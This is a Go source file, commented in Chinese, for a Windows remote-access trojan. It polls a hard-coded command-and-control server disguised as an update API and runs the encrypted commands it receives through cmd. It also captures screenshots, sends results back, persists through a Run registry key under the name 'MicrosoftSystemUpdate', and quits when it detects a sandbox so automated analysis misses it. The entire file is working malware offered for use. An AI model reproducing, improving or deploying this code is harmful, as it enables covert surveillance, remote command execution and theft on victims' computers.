package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"net/http"
	"math/big"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/kbinani/screenshot" // 第三方截图库
	"golang.org/x/sys/windows/registry"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

// [配置] 你的 Cloudflare 域名
const C2_URL = "https://api.cailiu666.xyz/api/v1/check_update"

var AESKey = []byte("HereIsMySecretKey123456789012345")
const AppName = "MicrosoftSystemUpdate"
const ExeName = "sys_update.exe"

// --- 结构体 ---
type FakeAPIResponse struct {
	Code    int    `json:"code"`
	Message string `json:"message"`
	Data    string `json:"data"`
}

type FakeAPIRequest struct {
	Hostname string `json:"hostname"`
	Token    string `json:"token"`
	Status   string `json:"status"`
}

// --- [新增] 获取唯一主机名 ---
// 格式: 真实主机名-随机后缀 (例如: DESKTOP-ADMIN-a1b2)
func getHostname() string {
	// 1. 获取系统真实主机名
	name, err := os.Hostname()
	if err != nil {
		name = "UNKNOWN"
	}
	
	// 2. 生成 4 位随机后缀 (防止克隆机重名)
	// 使用 crypto/rand 生成真随机数
	const letters = "0123456789abcdef"
	suffix := make([]byte, 4)
	for i := 0; i < 4; i++ {
		num, _ := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
		suffix[i] = letters[num.Int64()]
	}

	return fmt.Sprintf("%s-%s", name, string(suffix))
}

// --- 模块 1: 反沙箱/反虚拟机 ---
// 如果返回 true，说明环境可疑，应当退出
func checkSandbox() bool {
	// 1. 检查 CPU 核心数
	// 大多数沙箱分配的 CPU 核心数很少 (< 2)
	if runtime.NumCPU() < 2 {
		return true
	}

	// 2. (可选) 可以在这里检查 MAC 地址前缀、硬盘大小等
	// 为了演示稳定性，目前只检查 CPU
	return false
}

// --- 模块 2: 屏幕截图 ---
func takeScreenshot() string {
	// 获取主显示器的范围
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return "Error: No display found"
	}
	
	// 只截取第一个屏幕
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return fmt.Sprintf("Error capturing screen: %v", err)
	}

	// 编码为 PNG -> Buffer -> Base64
	var buf bytes.Buffer
	err = png.Encode(&buf, img)
	if err != nil {
		return fmt.Sprintf("Error encoding png: %v", err)
	}

	// 添加特殊前缀 [IMAGE]，方便前端识别
	return "[IMAGE]" + base64.StdEncoding.EncodeToString(buf.Bytes())
}

// --- 模块 3: 持久化 ---
func installPersistence() {
	exePath, err := os.Executable()
	if err != nil { return }
	configDir, err := os.UserConfigDir()
	if err != nil { return }
	destPath := filepath.Join(configDir, ExeName)

	if strings.EqualFold(exePath, destPath) { return }

	input, err := os.ReadFile(exePath)
	if err != nil { return }
	err = os.WriteFile(destPath, input, 0777)
	if err != nil { return }

	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	if err != nil { return }
	defer k.Close()
	k.SetStringValue(AppName, destPath)
}

// --- 辅助函数 ---
func GbkToUtf8(s []byte) (string, error) {
	reader := transform.NewReader(bytes.NewReader(s), simplifiedchinese.GBK.NewDecoder())
	d, err := io.ReadAll(reader)
	if err != nil { return "", err }
	return string(d), nil
}

func Encrypt(text string) (string, error) {
	block, err := aes.NewCipher(AESKey)
	if err != nil { return "", err }
	plaintext := []byte(text)
	aesGCM, err := cipher.NewGCM(block)
	if err != nil { return "", err }
	nonce := make([]byte, aesGCM.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil { return "", err }
	ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func Decrypt(cryptoText string) (string, error) {
	data, err := base64.StdEncoding.DecodeString(cryptoText)
	if err != nil { return "", err }
	block, err := aes.NewCipher(AESKey)
	if err != nil { return "", err }
	aesGCM, err := cipher.NewGCM(block)
	if err != nil { return "", err }
	nonceSize := aesGCM.NonceSize()
	if len(data) < nonceSize { return "", fmt.Errorf("ciphertext too short") }
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
	if err != nil { return "", err }
	return string(plaintext), nil
}

func executeCommand(cmdStr string) string {
	// [新增] 拦截截图指令
	if strings.TrimSpace(cmdStr) == "screenshot" {
		return takeScreenshot()
	}

	cmd := exec.Command("cmd", "/C", cmdStr)
	output, _ := cmd.CombinedOutput()
	utf8Output, err := GbkToUtf8(output)
	if err != nil { utf8Output = string(output) }
	return utf8Output
}

func main() {
	// [步骤 1] 启动前先进行环境检查 (反沙箱)
	if checkSandbox() {
		// 如果环境可疑，直接退出，不做任何操作
		// 这样自动分析系统就抓不到恶意行为了
		return 
	}

	installPersistence()

	// 配置 HTTPS 忽略证书错误
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Timeout: 30 * time.Second, Transport: tr} // 截图上传需要时间，增加超时

	// 这里的 Hostname 后面加上 -v2 方便你区分新版 Agent
	hostname := getHostname()

	fmt.Printf("[*] Agent ID: %s\n", hostname)

	for {
		reqData := FakeAPIRequest{Hostname: hostname, Status: "idle"}
		jsonData, _ := json.Marshal(reqData)
		
		req, _ := http.NewRequest("POST", C2_URL, bytes.NewBuffer(jsonData))
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
		req.Header.Set("Content-Type", "application/json")

		resp, err := client.Do(req)
		if err != nil {
			time.Sleep(3 * time.Second)
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		var apiResp FakeAPIResponse
		if err := json.Unmarshal(body, &apiResp); err == nil {
			if apiResp.Data != "" {
				command, err := Decrypt(apiResp.Data)
				if err == nil {
					result := executeCommand(command)

					encryptedResult, _ := Encrypt(result)
					resultData := FakeAPIRequest{
						Hostname: hostname,
						Token:    encryptedResult,
						Status:   "success",
					}
					jsonResult, _ := json.Marshal(resultData)
					
					postReq, _ := http.NewRequest("POST", C2_URL, bytes.NewBuffer(jsonResult))
					postReq.Header.Set("User-Agent", "Mozilla/5.0...")
					postReq.Header.Set("Content-Type", "application/json")
					client.Do(postReq)
				}
			}
		}
		time.Sleep(3 * time.Second)
	}
}